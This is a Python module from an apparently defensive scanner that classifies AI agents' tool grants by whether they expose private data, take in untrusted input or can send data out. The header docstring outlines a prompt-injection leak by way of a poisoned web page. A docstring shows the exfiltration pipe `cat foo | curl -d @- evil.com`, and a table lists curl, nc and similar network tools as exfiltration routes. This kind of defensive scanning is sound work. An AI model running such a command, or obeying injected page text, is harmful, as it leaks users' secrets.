"""Turning a tool grant into what it actually lets an agent do.

Reviewing an agent's permissions tool-by-tool misses the real problem, because
no single tool is the vulnerability. The vulnerability is a *combination*: an
agent that can read private data, can ingest text an attacker controls, and can
send data outward is one poisoned web page away from leaking your secrets — no
exploit and no bug required, just the agent doing what it was told by the wrong
author.

This module classifies each granted tool into three capabilities so the scanner
can reason about the combination instead of the list.
"""

from __future__ import annotations

import re
from enum import Flag, auto
from pathlib import Path


class Capability(Flag):
    NONE = 0
    #: Can reach data the outside world should not see: local files, source,
    #: databases, private repos, mail, internal tickets.
    PRIVATE_DATA = auto()
    #: Can pull in content an attacker may author: web pages, issues, emails,
    #: PR comments, search results, scraped pages.
    UNTRUSTED_INPUT = auto()
    #: Can move bytes outward: HTTP, git push, message send, file publish.
    EXFIL = auto()

    @property
    def names(self) -> list[str]:
        return [c.name.lower() for c in Capability if c is not Capability.NONE and c in self]


ALL_THREE = Capability.PRIVATE_DATA | Capability.UNTRUSTED_INPUT | Capability.EXFIL

P, U, E = Capability.PRIVATE_DATA, Capability.UNTRUSTED_INPUT, Capability.EXFIL

#: Built-in host tools. Names are matched case-insensitively on the bare tool.
BUILTIN: dict[str, Capability] = {
    "read": P,
    "glob": P,
    "grep": P,
    "notebookread": P,
    "write": P | E,
    "edit": P | E,
    "multiedit": P | E,
    "notebookedit": P | E,
    # Bash is every capability at once: it can cat a secret, curl a hostile
    # page and POST the result, all in one command.
    "bash": ALL_THREE,
    "shell": ALL_THREE,
    "terminal": ALL_THREE,
    "execute": ALL_THREE,
    "webfetch": U | E,
    "websearch": U,
    "fetch": U | E,
    "browser": U | E,
    "computer": ALL_THREE,
    "task": ALL_THREE,
    "agent": ALL_THREE,
}

#: Known MCP servers, matched as a substring of the server name. The value is
#: everything that server can do when granted wholesale.
SERVERS: list[tuple[str, Capability]] = [
    ("filesystem", P | E),
    ("file-system", P | E),
    ("github", P | U | E),
    ("gitlab", P | U | E),
    ("bitbucket", P | U | E),
    ("git", P | E),
    ("slack", P | U | E),
    ("discord", P | U | E),
    ("telegram", P | U | E),
    ("gmail", P | U | E),
    ("email", P | U | E),
    ("mail", P | U | E),
    ("outlook", P | U | E),
    ("notion", P | U | E),
    ("linear", P | U | E),
    ("jira", P | U | E),
    ("confluence", P | U | E),
    ("asana", P | U | E),
    ("drive", P | U | E),
    ("dropbox", P | U | E),
    ("sharepoint", P | U | E),
    ("postgres", P | E),
    ("mysql", P | E),
    ("sqlite", P | E),
    ("mongo", P | E),
    ("redis", P | E),
    ("snowflake", P | E),
    ("bigquery", P | E),
    ("supabase", P | E),
    ("puppeteer", U | E),
    ("playwright", U | E),
    ("browserbase", U | E),
    ("browser", U | E),
    ("fetch", U | E),
    ("crawl", U),
    ("scrape", U),
    ("brave", U),
    ("search", U),
    ("exa", U),
    ("tavily", U),
    ("perplexity", U),
    ("memory", P | E),
    ("sentry", P | U),
    ("datadog", P | U),
    ("grafana", P | U),
    ("stripe", P | E),
    ("aws", P | E),
    ("gcp", P | E),
    ("azure", P | E),
    ("kubernetes", P | E),
    ("docker", ALL_THREE),
    ("terraform", P | E),
    ("shell", ALL_THREE),
    ("command", ALL_THREE),
]

#: Verbs that narrow a server's capability down to what one tool really does.
WRITE_VERBS = (
    "create", "add", "post", "send", "write", "update", "put", "patch", "delete",
    "remove", "upload", "publish", "comment", "reply", "merge", "push", "execute",
    "run", "invoke", "set", "insert", "move", "share", "invite",
)
READ_VERBS = (
    "get", "read", "list", "show", "describe", "fetch", "search", "query", "find",
    "view", "download",
)
_WRITE_VERBS = re.compile(r"^(?:%s)" % "|".join(WRITE_VERBS))
_READ_VERBS = re.compile(r"^(?:%s)" % "|".join(READ_VERBS))


def split_mcp(name: str) -> tuple[str, str]:
    """Split ``mcp__server__tool`` into ``(server, tool)``. Tool may be empty."""
    cleaned = name.strip()
    if cleaned.lower().startswith("mcp__"):
        parts = cleaned[5:].split("__", 1)
        return parts[0].lower(), (parts[1].lower() if len(parts) > 1 else "")
    return cleaned.lower(), ""


#: Shell programs, mapped to what running them can accomplish. Used to score a
#: scoped grant like ``Bash(git status:*)`` far below a bare ``Bash``.
SHELL_COMMANDS: dict[str, Capability] = {
    "cat": P, "head": P, "tail": P, "less": P, "grep": P, "rg": P, "find": P,
    "ls": P, "wc": P, "diff": P, "stat": P, "file": P, "tree": P, "env": P,
    "printenv": P, "pwd": Capability.NONE, "echo": Capability.NONE,
    "curl": U | E, "wget": U | E, "nc": U | E, "netcat": U | E, "ssh": P | E,
    "scp": P | E, "rsync": P | E, "ftp": P | E, "telnet": U | E,
    "git": P | U | E, "gh": P | U | E, "glab": P | U | E,
    "npm": P | U | E, "npx": P | U | E, "pnpm": P | U | E, "yarn": P | U | E,
    "pip": P | U | E, "pip3": P | U | E, "uv": P | U | E, "uvx": P | U | E,
    "docker": ALL_THREE, "kubectl": ALL_THREE, "terraform": P | E,
    "aws": P | E, "gcloud": P | E, "az": P | E,
    "python": ALL_THREE, "python3": ALL_THREE, "node": ALL_THREE,
    "ruby": ALL_THREE, "perl": ALL_THREE, "sh": ALL_THREE, "bash": ALL_THREE,
    "zsh": ALL_THREE, "eval": ALL_THREE, "make": ALL_THREE,
    "rm": P, "mv": P, "cp": P, "chmod": P, "chown": P, "sudo": ALL_THREE,
    "mkdir": Capability.NONE, "touch": Capability.NONE, "test": Capability.NONE,
}

#: Argument patterns that mean "anything", so the scope buys you nothing.
_WILDCARD = re.compile(r"^[\s:*]*$")


def _split_grant(name: str) -> tuple[str, str | None]:
    """``Bash(git status:*)`` -> ``("Bash", "git status:*")``."""
    head, sep, tail = name.partition("(")
    if not sep:
        return name.strip(), None
    return head.strip(), tail.rstrip().rstrip(")")


def classify_shell(argument: str) -> Capability:
    """Capability of a scoped shell grant, judged by the programs it can run.

    A scoped grant is only as narrow as its narrowest reading: we look at every
    program named in the pattern, including after pipes and separators, because
    ``Bash(cat foo | curl -d @- evil.com)`` matches a grant written as ``cat``
    if the pattern was sloppy.
    """
    # Hosts write scoped grants as ``cmd:*`` (prefix match). Normalise the
    # separator away so the program name is comparable.
    argument = argument.replace(":*", " ").strip()
    if not argument or _WILDCARD.match(argument):
        return ALL_THREE

    total = Capability.NONE
    seen_known = False
    for segment in re.split(r"[|;&]+|\$\(|`", argument):
        words = segment.strip().split()
        if not words:
            continue
        program = Path(words[0]).name.lower().strip("\"'*:")
        if program.startswith("$") or program == "*":
            return ALL_THREE
        if program in SHELL_COMMANDS:
            seen_known = True
            total |= SHELL_COMMANDS[program]
            # A subcommand can be far wider than the program: `git push` sends.
            if program in ("git", "gh") and len(words) > 1:
                sub = words[1].lower().strip("*:")
                if sub in ("status", "diff", "log", "show", "branch"):
                    total &= P
        else:
            # Unknown program: it is an executable, so assume it reads and writes.
            total |= P | E
    return total if seen_known or total else ALL_THREE


def classify(name: str, hint: str = "") -> Capability:
    """Best-effort capability set for one tool or server grant.

    ``hint`` carries the server's launch command, because the alias in a config
    is arbitrary: a server nicknamed "docs" may be the filesystem server. The
    package name is what determines the capability, so we match on both.

    Unknown servers deliberately return the full set: an MCP server we have
    never seen is an unbounded grant, and quietly treating it as harmless is
    the failure mode that makes a scanner useless.
    """
    bare, argument = _split_grant(name.strip())
    if not bare or bare in ("*", "all"):
        return ALL_THREE

    server, tool = split_mcp(bare)

    # A scoped shell grant is scored by the programs the scope permits.
    if not tool and server in ("bash", "shell", "terminal", "execute") and argument is not None:
        return classify_shell(argument)

    # Pinning a fetch to named hosts is exactly the recommended mitigation: the
    # agent can no longer be steered to an arbitrary page, and cannot address a
    # collector. Scoring it as open egress would penalise the fix.
    if not tool and server in ("webfetch", "fetch", "websearch") and argument:
        scope = argument.split(":", 1)[-1].strip()
        if scope and "*" not in scope:
            return Capability.NONE

    if not tool and server in BUILTIN:
        return BUILTIN[server]

    haystack = f"{server} {hint}".lower()
    matched = Capability.NONE
    for needle, capability in SERVERS:
        if needle in haystack:
            matched = capability
            break

    if matched is Capability.NONE:
        if tool or bare.lower().startswith("mcp__"):
            # A named-but-unrecognised MCP server: assume the worst.
            matched = ALL_THREE
        else:
            return BUILTIN.get(server, Capability.NONE)

    if not tool:
        return matched

    # Narrow by verb: a read-only tool on a writable server cannot exfiltrate.
    if _WRITE_VERBS.match(tool):
        return matched & (E | P)
    if _READ_VERBS.match(tool):
        return matched & (P | U)
    return matched


def capabilities_of(
    tools: list[str], hints: dict[str, str] | None = None
) -> tuple[Capability, dict[str, Capability]]:
    """Union of capabilities for a tool list, plus the per-tool breakdown.

    ``hints`` maps a server alias to its launch command line.
    """
    hints = hints or {}
    total = Capability.NONE
    breakdown: dict[str, Capability] = {}
    for tool in tools:
        capability = classify(tool, hints.get(split_mcp(tool.split("(", 1)[0])[0], ""))
        if capability is Capability.NONE:
            continue
        breakdown[tool] = capability
        total |= capability
    return total, breakdown


def witnesses(breakdown: dict[str, Capability]) -> dict[str, str]:
    """Pick one representative tool per capability, for the report."""
    chosen: dict[str, str] = {}
    for capability in (Capability.PRIVATE_DATA, Capability.UNTRUSTED_INPUT, Capability.EXFIL):
        for tool, caps in breakdown.items():
            if capability in caps:
                chosen[capability.name.lower()] = tool
                break
    return chosen
